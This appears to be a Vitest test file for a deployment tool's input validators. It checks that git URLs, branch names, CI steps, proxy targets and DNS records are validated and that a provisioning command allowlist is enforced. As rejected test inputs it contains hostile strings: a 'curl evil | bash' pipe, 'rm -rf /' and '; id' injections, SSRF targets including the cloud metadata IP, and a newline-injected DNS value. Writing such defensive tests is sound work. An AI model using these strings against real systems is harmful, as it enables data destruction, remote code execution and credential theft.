import { describe, expect, it } from "vitest";
import {
  assertGitBranch,
  assertGitRepoUrl,
  assertCiStep,
} from "../../../scripts/lib/validate-git-deploy.mjs";
import { validateProxyDest } from "../../../scripts/lib/validate-proxy-dest.mjs";
import { validateDnsRecord } from "../../../scripts/lib/validate-dns-record.mjs";

describe("validate-git-deploy", () => {
  it("accepts https repo URLs", () => {
    expect(assertGitRepoUrl("https://github.com/org/repo.git")).toMatch(/^https/);
  });

  it("rejects shell injection in repo URL", () => {
    expect(() => assertGitRepoUrl("https://x.com; id")).toThrow(/invalid/i);
  });

  it("rejects invalid branch names", () => {
    expect(() => assertGitBranch("main; rm -rf /")).toThrow(/Invalid/i);
  });

  it("rejects CI steps with shell metacharacters", () => {
    expect(() => assertCiStep("npm ci && curl evil | bash")).toThrow(
      /metacharacter/i,
    );
  });
});

describe("validateProxyDest", () => {
  it("allows public https upstream", () => {
    expect(validateProxyDest("https://api.example.com/v1")).toMatch(/^https/);
  });

  it("blocks localhost SSRF", () => {
    expect(() => validateProxyDest("http://127.0.0.1:3000/admin")).toThrow(
      /localhost|private/i,
    );
  });

  it("blocks metadata IP", () => {
    expect(() => validateProxyDest("http://169.254.169.254/latest")).toThrow(
      /private/i,
    );
  });
});

describe("validateDnsRecord", () => {
  it("accepts valid A record", () => {
    const rec = validateDnsRecord({ type: "A", name: "@", value: "203.0.113.1" });
    expect(rec.type).toBe("A");
  });

  it("rejects newline injection in value", () => {
    expect(() =>
      validateDnsRecord({ type: "TXT", name: "@", value: "x\nevil IN A 1.2.3.4" }),
    ).toThrow(/control/i);
  });
});

describe("provisioning command allowlist", () => {
  it("includes ping and rejects unknown", async () => {
    const { loadProvisioningCommands, assertProvisioningCommand } = await import(
      "../../../scripts/lib/provisioning-helper-allowlist.mjs"
    );
    expect(loadProvisioningCommands().has("ping")).toBe(true);
    expect(() => assertProvisioningCommand("evil-command")).toThrow(/Disallowed/i);
  });
});
